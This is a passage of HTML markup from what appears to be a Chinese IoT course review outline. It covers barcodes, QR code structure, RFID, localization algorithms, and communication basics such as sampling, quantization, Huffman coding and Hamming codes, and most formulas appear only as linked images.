&gt;&lt;/p&gt;
&lt;p&gt;交叉二五条码：在二五条码的基础上，扩展到空也表示信息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018801-1866241342.png&#34;
	width=&#34;913&#34;
	height=&#34;337&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018801-1866241342_hu18282287845256082902.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018801-1866241342_hu17047939291939332730.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151031866&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;270&#34;
		data-flex-basis=&#34;650px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;三九条码：三九条码是一种一维条形码，是一种可供使用者双向扫描的分散式条码。&lt;/p&gt;
&lt;p&gt;三九条码拥有编码规则简单、误码率低，能表示字符个数多等特点。&lt;/p&gt;
&lt;p&gt;三九条码仅有两种单元宽度——宽单元和窄单元。宽单元的宽度为窄单元的1~3倍，一般多选用2倍、2.5倍或3倍。三九条码的每一个条码字符由九个单元组成，其中有三个宽单元，其余是窄单元，因此称为三九条码。三九条码的长度没有强迫性限制；三九条码的检查码可有可无；三九条码的起始码与终止码均为*字符。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019044-1818631014.png&#34;
	width=&#34;417&#34;
	height=&#34;186&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019044-1818631014_hu11417634095940091063.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019044-1818631014_hu13711494972199197984.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151035181&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;224&#34;
		data-flex-basis=&#34;538px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;3p82二维矩形码相比于一维条形码的优势&#34;&gt;3.[P82]二维矩形码相比于一维条形码的优势。
&lt;/h2&gt;&lt;p&gt;二维码的特点：&lt;/p&gt;
&lt;p&gt;(1)信息容量大&lt;/p&gt;
&lt;p&gt;(2)编码范围广&lt;/p&gt;
&lt;p&gt;(3)保密、防伪性能好&lt;/p&gt;
&lt;p&gt;(4)译码可靠性高&lt;/p&gt;
&lt;p&gt;(5)修正错误能力强&lt;/p&gt;
&lt;p&gt;(6)容易制作且成本很低&lt;/p&gt;
&lt;p&gt;(7)条码符号的形状可变&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019440-1049351575.png&#34;
	width=&#34;913&#34;
	height=&#34;469&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019440-1049351575_hu7461351205896363487.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019440-1049351575_hu9920883302572264254.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151039664&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;194&#34;
		data-flex-basis=&#34;467px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;4p88快速反应qr码的码结构和各部分的意义&#34;&gt;4.[P88]快速反应(QR)码的码结构和各部分的意义。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;QR Code的结构：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019723-1164163182.png&#34;
	width=&#34;691&#34;
	height=&#34;439&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019723-1164163182_hu425728436892658422.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152019723-1164163182_hu14180594464248147668.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151118540&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;157&#34;
		data-flex-basis=&#34;377px&#34;
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;QR Code有五个部分：
&lt;ul&gt;
&lt;li&gt;定位图形：用于对二维码的定位，不同的qrcode固定存在，大小规格会有差异&lt;/li&gt;
&lt;li&gt;校正图形：规格确定，校正图形的数量和位置也就确定了。&lt;/li&gt;
&lt;li&gt;格式信息：表示该二维码的纠错级别，分为L、M、Q、H.&lt;/li&gt;
&lt;li&gt;版本信息：二维码的规格，总共有40种规格矩阵。&lt;/li&gt;
&lt;li&gt;数据和纠错码：实际保存的二维码信息和纠错码字（用于修正二维码损坏带来的错误）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5p92射频识别rfid系统的组成和工作原理&#34;&gt;5.[P92]射频识别(RFID)系统的组成和工作原理。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;RFID系统由电子标签、读写器和计算机网络组成的自动识别系统。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;从工作原理来看，系统一般由信号发射机、信号接收机、发射接收天线三部分组成。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;工作原理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;电子标签和读写器利用各自携带的天线构筑两者之间进行数据传输的非接触式的通道。&lt;/li&gt;
&lt;li&gt;当标签处于读写器的工作范围时，读写器用天线发信号。&lt;/li&gt;
&lt;li&gt;电子标签接受信号产生感应电流，激活内部电路向读写器回送信号，或主动向读写器发送信号。&lt;/li&gt;
&lt;li&gt;读写器收到信号后对信号做处理，然后将处理后的数据上传到数据管理系统进行下一步处理。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6p118两类定位技术基于测距和非测距的工作原理结合实验内容&#34;&gt;6.[P118]两类定位技术(基于测距和非测距)的工作原理(结合实验内容)。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;基于测距：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过超声波或者无线电信号，测量声波或信号发送端到接收端时的信号强度、信号相位差以及信号传播时间差获取节点间的角度或距离信息。再利用空间几何方法完成未知节点的定位。&lt;/li&gt;
&lt;li&gt;[P125]定位算法：时间定位（TOA）、到达时差定位（TDOA）、方向测量定位(AOA)、信号强度定位(RSSI)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;无需测距：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过节点之间的信息交换和整个网络的连通性来实现定位，不需要额外网络设备。&lt;/li&gt;
&lt;li&gt;[P130]定位算法：DV-Hop定位、APIT定位算法、凸规划算法。
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020003-799689361.png&#34;
	width=&#34;853&#34;
	height=&#34;204&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020003-799689361_hu15569590442359255174.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020003-799689361_hu6453380067936040430.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151127245&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;418&#34;
		data-flex-basis=&#34;1003px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;第四章&#34;&gt;第四章
&lt;/h1&gt;&lt;h2 id=&#34;1p138物联网通信系统模型和各模块的功能&#34;&gt;1.[P138]物联网通信系统模型和各模块的功能。
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020362-2080205815.png&#34;
	width=&#34;913&#34;
	height=&#34;260&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020362-2080205815_hu4569541350905637377.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020362-2080205815_hu14942757687194657826.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151130451&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;351&#34;
		data-flex-basis=&#34;842px&#34;
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;信源：传感器在感知层采集到的信息。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;采样量化：模数变化，把作为模拟信号的原始信息在时间域和幅值域进行离散化处理，得到有限个幅度值的离散信号。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;编码：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;信源编码：提高传输有效性：保证无失真的情况下用平均码长最短的码承载信源信息熵。&lt;/li&gt;
&lt;li&gt;信道编码：提高传输可靠性，引入额外监督位。&lt;/li&gt;
&lt;li&gt;编码后输出的数字信号叫基带信号。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;调制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目的：适合信道的传输特性并实现多路复用和多址接入。&lt;/li&gt;
&lt;li&gt;实现：将低频基带信号搬移到高频载波信号处。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;同步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;载波同步：在接收端需要一个与发射端调制模块同频同相的载波信号，用于恢复出数字基带信号。&lt;/li&gt;
&lt;li&gt;帧同步：使接收端知道每一帧数据包中有用的信息的开始和结束。&lt;/li&gt;
&lt;li&gt;位同步：使接收端知道并判定每一位数字信号位。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2p140通信指标的计算和物理意义&#34;&gt;2.[P140]通信指标的计算和物理意义。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;数据传输速率&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一种：
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020612-992352474.png&#34;
	width=&#34;853&#34;
	height=&#34;159&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020612-992352474_hu17173876081894985859.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020612-992352474_hu3183081681468365385.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151135830&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;536&#34;
		data-flex-basis=&#34;1287px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;例题：
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020845-672122140.png&#34;
	width=&#34;853&#34;
	height=&#34;95&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020845-672122140_hu13915012369750090964.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152020845-672122140_hu17857177793367591369.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151138962&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;897&#34;
		data-flex-basis=&#34;2154px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第二种：
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021106-786457018.png&#34;
	width=&#34;853&#34;
	height=&#34;278&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021106-786457018_hu365250072676767176.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021106-786457018_hu698444988413982011.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151143945&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;306&#34;
		data-flex-basis=&#34;736px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;误码率&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021398-1810510854.png&#34;
	width=&#34;883&#34;
	height=&#34;310&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021398-1810510854_hu13897961140673195704.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021398-1810510854_hu17114673733960123207.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151149390&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;284&#34;
		data-flex-basis=&#34;683px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;信道容量&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对于有限带宽无噪声信道：
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021678-1752033939.png&#34;
	width=&#34;853&#34;
	height=&#34;253&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021678-1752033939_hu4729642935247292522.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021678-1752033939_hu17294744912194584289.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151154482&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;337&#34;
		data-flex-basis=&#34;809px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对于有限带宽随机噪声信道：
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021986-1072195080.png&#34;
	width=&#34;853&#34;
	height=&#34;548&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021986-1072195080_hu6503329920363936067.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152021986-1072195080_hu395800175339060973.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151157978&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;155&#34;
		data-flex-basis=&#34;373px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3p143采样定理及物理意义&#34;&gt;3.[P143]采样定理及物理意义。
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022319-98562069.png&#34;
	width=&#34;893&#34;
	height=&#34;348&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022319-98562069_hu7755487715523562487.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022319-98562069_hu9287752565213554689.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151206489&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;256&#34;
		data-flex-basis=&#34;615px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;4p144非均匀量化相比于均匀量化的优势及实现原理&#34;&gt;4.[P144]非均匀量化相比于均匀量化的优势及实现原理
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;量化特征有【均匀量化】和【非均匀量化】&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【均匀量化】的分层间隔为等间隔，适用于幅度均匀的分布的信号。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;特点：概率密度大的区域分层间隔小，反之分层间隔大。&lt;/li&gt;
&lt;li&gt;缺点：在满足信噪比要求的输入信号取值范围内进行均匀量化时，信号动态范围将受到较大限制。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;【非均匀量化】：根据信号的不同区间确定间隔。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;特点：小信号量化台阶减小，大信号的量化台阶增大。&lt;/li&gt;
&lt;li&gt;改善小信号的信噪比，并在不增大量化级数的条件下使信号在较宽动态范围内信噪比达到指标要求。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5p147无失真离散无记忆信源编码定理和变长编码&#34;&gt;5.[P147]无失真离散无记忆信源编码定理和变长编码。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;信息量：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022599-1838208343.png&#34;
	width=&#34;757&#34;
	height=&#34;467&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022599-1838208343_hu7969340344424425524.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022599-1838208343_hu9213405946960541910.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151217887&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;162&#34;
		data-flex-basis=&#34;389px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;信道熵：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022853-588643550.png&#34;
	width=&#34;715&#34;
	height=&#34;278&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022853-588643550_hu10212447359117420290.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152022853-588643550_hu12161853175186726170.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151222118&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;257&#34;
		data-flex-basis=&#34;617px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;信源编码定理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023121-1017128870.png&#34;
	width=&#34;883&#34;
	height=&#34;81&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023121-1017128870_hu10501924880612438713.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023121-1017128870_hu11650732265191720238.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151225320&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1090&#34;
		data-flex-basis=&#34;2616px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;变长编码：根据信源输出符号出现概率不同选择码字，出现概率大用短码，小的用长码，这样平均码长最短。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;哈夫曼编码：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023373-387478777.png&#34;
	width=&#34;717&#34;
	height=&#34;255&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023373-387478777_hu5410418826965075226.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023373-387478777_hu3591937892463402669.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151228964&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;281&#34;
		data-flex-basis=&#34;674px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个综合例题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023645-1185344687.png&#34;
	width=&#34;805&#34;
	height=&#34;365&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023645-1185344687_hu9160041075302415823.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023645-1185344687_hu18313169121587396386.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151232873&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;220&#34;
		data-flex-basis=&#34;529px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6p151线性分组码的实现和相关概念监督矩阵生成矩阵&#34;&gt;6.[P151]线性分组码的实现和相关概念（监督矩阵、生成矩阵）。
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;k个信息位，r个监督位&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023900-1256138204.png&#34;
	width=&#34;347&#34;
	height=&#34;132&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023900-1256138204_hu265973280428375602.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152023900-1256138204_hu6045252713228032114.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151237158&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;262&#34;
		data-flex-basis=&#34;630px&#34;
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;监督矩阵和生成矩阵都是海明码，书上是（7，4）海明码，应该就考74乐&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;监督矩阵Q：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024340-171353850.png&#34;
	width=&#34;901&#34;
	height=&#34;182&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024340-171353850_hu8406175312659728040.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024340-171353850_hu16580522587967378861.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151242584&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;495&#34;
		data-flex-basis=&#34;1188px&#34;
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;生成矩阵G：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152024630-1210909689.png&#34;
	width=&#34;897&#34;
	height=&#34;206&#34;
